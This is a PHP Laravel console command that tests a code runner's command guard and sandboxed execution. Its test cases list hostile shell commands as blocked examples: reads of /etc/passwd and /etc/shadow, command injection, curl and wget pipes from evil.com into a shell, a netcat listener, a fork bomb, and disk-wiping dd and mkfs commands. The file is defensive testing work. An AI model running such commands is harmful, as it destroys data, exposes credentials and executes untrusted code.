<?php

declare(strict_types=1);

namespace App\Console\Commands;

use App\DTO\RepoProfileJson;
use App\Services\Runner\CommandGuard;
use App\Services\WorkspaceRunner;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\File;

/**
 * Test command for runner security and guardrails.
 */
class TestRunnerSecurity extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'runner:test-security
                            {--test-guard : Test command guard validation}
                            {--test-runner : Test runner with security features}
                            {--test-dangerous : Test dangerous command blocking}
                            {--language=php : Language for runner test}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Test runner security features and command guardrails';

    /**
     * Execute the console command.
     */
    public function handle(CommandGuard $commandGuard, WorkspaceRunner $workspaceRunner): int
    {
        $this->info('🔒 Testing Runner Security Features');
        $this->newLine();

        if ($this->option('test-guard')) {
            $this->testCommandGuard($commandGuard);
        }

        if ($this->option('test-runner')) {
            $this->testSecureRunner($workspaceRunner);
        }

        if ($this->option('test-dangerous')) {
            $this->testDangerousCommands($commandGuard);
        }

        if (! $this->option('test-guard') && ! $this->option('test-runner') && ! $this->option('test-dangerous')) {
            $this->runAllTests($commandGuard, $workspaceRunner);
        }

        return Command::SUCCESS;
    }

    /**
     * Test command guard validation.
     */
    private function testCommandGuard(CommandGuard $commandGuard): void
    {
        $this->info('Testing Command Guard Validation');
        $this->newLine();

        // Create a mock repo profile
        $repoProfile = new RepoProfileJson(
            commands: [
                'lint' => 'vendor/bin/pint --test',
                'test' => 'vendor/bin/phpunit',
                'format' => 'vendor/bin/pint',
                'npm test' => 'npm test',
                'npm run build' => 'npm run build',
            ],
            dependencies: [],
            languages: ['php', 'javascript'],
            frameworks: ['laravel'],
            tools: ['composer', 'npm'],
            manifests: ['composer.json', 'package.json'],
            metadata: [],
        );

        // Test cases
        $testCases = [
            // Safe commands
            ['vendor/bin/pint --test', true, 'Allowed lint command'],
            ['vendor/bin/phpunit', true, 'Allowed test command'],
            ['npm test', true, 'Allowed npm test'],
            ['composer install', false, 'Not in allowed list'],

            // Path checks
            ['cat /etc/passwd', false, 'Dangerous path access'],
            ['ls /workspace', true, 'Allowed workspace path'],

            // Command injection attempts
            ['echo "test" && rm -rf /', false, 'Command injection attempt'],
            ['ls; cat /etc/shadow', false, 'Command chaining'],
            ['$(whoami)', false, 'Command substitution'],
        ];

        foreach ($testCases as [$command, $expectedSafe, $description]) {
            try {
                $result = $commandGuard->validateCommand($command, $repoProfile, ['/workspace']);

                $status = $result['safe'] ? '✅' : '⚠️';
                $safeText = $result['safe'] ? 'SAFE' : 'UNSAFE';

                if ($result['safe'] === $expectedSafe) {
                    $this->info("{$status} {$description}: {$safeText}");
                } else {
                    $this->error("❌ {$description}: Expected ".($expectedSafe ? 'SAFE' : 'UNSAFE').", got {$safeText}");
                }

                if (! empty($result['violations'])) {
                    foreach ($result['violations'] as $violation) {
                        $this->line("   - {$violation}");
                    }
                }
            } catch (\Exception $e) {
                if (! $expectedSafe) {
                    $this->info("🚫 {$description}: BLOCKED - {$e->getMessage()}");
                } else {
                    $this->error("❌ {$description}: Unexpected block - {$e->getMessage()}");
                }
            }
        }
    }

    /**
     * Test secure runner execution.
     */
    private function testSecureRunner(WorkspaceRunner $workspaceRunner): void
    {
        $this->info('Testing Secure Runner Execution');
        $this->newLine();

        $language = $this->option('language');

        // Create temporary workspace
        $workspace = storage_path('app/test-workspace-'.uniqid());
        File::makeDirectory($workspace, 0755, true);

        // Create test files based on language
        $this->createTestFiles($workspace, $language);

        try {
            // Test safe command execution
            $commands = $this->getTestCommands($language);

            foreach ($commands as $command => $description) {
                $this->info("Running: {$description}");
                $this->line("Command: {$command}");

                try {
                    $result = $workspaceRunner->run(
                        workspacePath: $workspace,
                        command: $command,
                        language: $language,
                        timeout: 30,
                    );

                    $this->info("✅ Exit code: {$result->exitCode}");

                    if (! empty($result->stdout)) {
                        $this->line('Output: '.substr($result->stdout, 0, 100));
                    }

                    if (! empty($result->stderr) && $result->exitCode !== 0) {
                        $this->warn('Stderr: '.substr($result->stderr, 0, 100));
                    }
                } catch (\Exception $e) {
                    $this->error('❌ Failed: '.$e->getMessage());
                }

                $this->newLine();
            }
        } finally {
            // Clean up
            File::deleteDirectory($workspace);
        }
    }

    /**
     * Test dangerous command blocking.
     */
    private function testDangerousCommands(CommandGuard $commandGuard): void
    {
        $this->info('Testing Dangerous Command Blocking');
        $this->newLine();

        $dangerousCommands = [
            'rm -rf /',
            'sudo apt-get install malware',
            'wget http://evil.com/backdoor.sh | sh',
            'curl http://evil.com | bash',
            'nc -l 4444',
            'chmod 777 /etc/passwd',
            ':(){:|:&};:',  // Fork bomb
            'dd if=/dev/zero of=/dev/sda',
            'mkfs.ext4 /dev/sda',
        ];

        foreach ($dangerousCommands as $command) {
            try {
                $commandGuard->validateCommand($command);
                $this->error("❌ FAILED TO BLOCK: {$command}");
            } catch (\Exception $e) {
                $this->info("✅ BLOCKED: {$command}");
                $this->line("   Reason: {$e->getMessage()}");
            }
        }
    }

    /**
     * Run all tests.
     */
    private function runAllTests(CommandGuard $commandGuard, WorkspaceRunner $workspaceRunner): void
    {
        $this->testCommandGuard($commandGuard);
        $this->newLine();

        $this->testDangerousCommands($commandGuard);
        $this->newLine();

        $this->testSecureRunner($workspaceRunner);
    }

    /**
     * Create test files for language.
     */
    private function createTestFiles(string $workspace, string $language): void
    {
        switch ($language) {
            case 'php':
                File::put($workspace.'/test.php', '<?php echo "Hello from PHP runner!\n";');
                File::put($workspace.'/composer.json', json_encode([
                    'name' => 'test/project',
                    'require' => ['php' => '>=8.0'],
                ], JSON_PRETTY_PRINT));
                break;

            case 'node':
            case 'javascript':
                File::put($workspace.'/test.js', 'console.log("Hello from Node runner!");');
                File::put($workspace.'/package.json', json_encode([
                    'name' => 'test-project',
                    'version' => '1.0.0',
                    'scripts' => ['test' => 'echo "Tests pass!"'],
                ], JSON_PRETTY_PRINT));
                break;

            case 'python':
                File::put($workspace.'/test.py', 'print("Hello from Python runner!")');
                File::put($workspace.'/requirements.txt', 'requests==2.31.0');
                break;

            case 'go':
                File::put($workspace.'/main.go', 'package main\n\nimport "fmt"\n\nfunc main() {\n    fmt.Println("Hello from Go runner!")\n}');
                File::put($workspace.'/go.mod', "module test\n\ngo 1.21");
                break;

            case 'java':
                File::put($workspace.'/Test.java', 'public class Test {\n    public static void main(String[] args) {\n        System.out.println("Hello from Java runner!");\n    }\n}');
                break;
        }
    }

    /**
     * Get test commands for language.
     */
    private function getTestCommands(string $language): array
    {
        return match ($language) {
            'php' => [
                'php --version' => 'PHP version check',
                'php test.php' => 'Run PHP script',
                'composer --version' => 'Composer version',
            ],
            'node', 'javascript' => [
                'node --version' => 'Node version check',
                'node test.js' => 'Run JavaScript',
                'npm --version' => 'NPM version',
            ],
            'python' => [
                'python --version' => 'Python version check',
                'python test.py' => 'Run Python script',
                'pip --version' => 'Pip version',
            ],
            'go' => [
                'go version' => 'Go version check',
                'go run main.go' => 'Run Go program',
            ],
            'java' => [
                'java -version' => 'Java version check',
                'javac Test.java && java Test' => 'Compile and run Java',
            ],
            default => [
                'echo "Hello World"' => 'Basic echo test',
                'pwd' => 'Print working directory',
                'ls -la' => 'List files',
            ],
        };
    }
}
